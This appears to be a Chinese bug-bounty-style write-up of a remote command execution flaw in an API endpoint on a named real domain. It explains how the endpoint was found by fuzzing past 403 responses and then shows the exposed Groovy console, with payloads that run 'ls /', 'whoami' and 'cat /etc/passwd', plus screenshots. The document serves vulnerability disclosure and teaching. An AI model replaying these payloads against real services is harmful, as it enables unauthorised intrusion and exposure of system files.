---
title: XXapi站点命令执行漏洞
slug: 0044
---
# **XXapi站点命令执行漏洞**



## **0x01** 

**本次简单的分享这个漏洞应为之前分享的SSRF盲攻击跟这个漏洞是一样的，都是利用一模一样的思路得到攻击，所以大家如果没看明白就去公众号“快识”看看那篇SSRF的挖掘文章**



**在一次业务信息收集时发现了改地址，我利用微信“小程序”小程序可以查看许多URL，这些URL都是没办法被正常的方式发现，所以挖洞的时候信息搜集想当重要**



**![img](https://cdn.nlark.com/yuque/0/2026/png/60657001/1779965307622-290612aa-a529-49a4-a720-bdf5178cb1dc.png)**



## **0x02**



**正常来说api接口这种站点不是什么不常见的，应该属于主业务，就跟我之前分享的那个SSRF盲攻击一样，都是利用模糊测试得到的URL地址**



**扫描目录，得到了403**

**![img](https://cdn.nlark.com/yuque/0/2026/png/60657001/1779965307626-b5ff4580-c901-417b-8381-109ed34523bc.png)**



**得到403之后在对403下面隐藏的关键再来一次模糊测试，利用参数拼接在后进行FUZZ，得到了最新的完整地址**

**http://api.meituan.com/data/msm/ms?groovyInput=int+q%3D9**

**这个地址是最后得出的命令执行接口，很多403，404这些下面都隐藏着许多的接口，所以不要放弃对403，404的测试，大的漏洞都是隐藏的很深**



## **0x03**





**链接：http://api.meituan.com/data/msm/ms?groovyInput=int+q%3D9**

**![img](https://cdn.nlark.com/yuque/0/2026/png/60657001/1779965307722-f40ebf8a-0936-40bb-953f-6c45d05aa1e3.png)**

**这是个执行groovy语言的交互端：**

**下面执行系统命令：**

**执行命令:  ls /**

**Groovy代码是：Process p="ls /".text**

**![img](https://cdn.nlark.com/yuque/0/2026/png/60657001/1779965307836-463ecca1-d7aa-4b00-ae47-edebbd735f00.png)**

**执行命令：whoami** 

**代码是：Process p="whoami".execute().text**

**![img](https://cdn.nlark.com/yuque/0/2026/png/60657001/1779965307839-76e795b4-29e7-476e-9b56-4732b41d597b.png)**

**![img](https://cdn.nlark.com/yuque/0/2026/png/60657001/1779965308115-30d75107-6221-488e-ac63-4bbc0f60f66f.png)**

**执行：cat  /etc/passwd**

**代码：Process p="cat /etc/passwd".execute().text**

**![img](https://cdn.nlark.com/yuque/0/2026/png/60657001/1779965308165-12558564-ab5e-4106-b718-7250cb2f0887.png)**

**![img](https://cdn.nlark.com/yuque/0/2026/png/60657001/1779965308437-5e648c19-65b4-4d7e-ba60-749c036744d5.png)**